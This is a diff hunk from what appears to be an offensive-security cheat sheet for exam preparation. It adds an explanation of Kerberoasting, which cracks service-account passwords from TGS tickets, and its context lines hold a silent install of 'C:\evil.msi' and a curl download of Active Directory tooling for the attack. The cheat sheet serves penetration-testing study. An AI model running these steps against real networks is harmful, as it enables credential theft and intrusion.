@@ -1086,6 +1086,8 @@ msiexec /quiet /qn /i C:\evil.msi
 ```
 # ATTACK - ACTIVE DIRECTORY
 ## KERBEROASTING
+Kerber roasting a technique in which the passwords of service accounts are cracked. Kerber roasting is especially efficient if user accounts are used as service accounts. A TGS ticket can be requested for this user, with the TGS encrypted with the NTLM hash of the user's plaintext password. If the service account is a user account that has been created by the administrator, there is a greater chance that this ticket can be cracked, and therefore the password will be retrieved for the service. This TGS ticket can be cracked offline.
+
 ##### KERBEROASTING - LOAD REQUIREMENTS
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
